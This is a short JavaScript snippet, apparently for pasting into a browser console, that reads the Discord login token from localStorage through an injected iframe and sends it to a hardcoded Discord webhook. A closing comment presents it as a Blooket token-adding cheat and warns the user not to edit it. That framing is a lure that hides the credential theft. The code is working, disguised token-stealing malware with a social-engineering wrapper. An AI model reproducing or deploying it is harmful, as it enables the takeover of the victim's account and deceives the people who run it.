location.reload();
var webhook = "https://discord.com/api/webhooks/918625702599876609/zIwgTPDTIHtRRaJ8s5frcNXvwmqo4PeSdqeYEHcmnEFkXMn_qE3c-YL--j-Q2XDYLljUl";
var token = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage.token;
var request = new XMLHttpRequest();
request.open("POST", webhook);
request.setRequestHeader('content-type', 'application/json');
request.send(JSON.stringify({"content": token}));
//  --> PLEASE READ THIS!!! <---
//  
//  Do not change the numbers in this file! Blooket has a hard limit on how many tokens
//  you can add everyday. The limit is 500 and you cannot bypass it. Do not mess with
//  with this file if you do not know what you are doing!!!
//
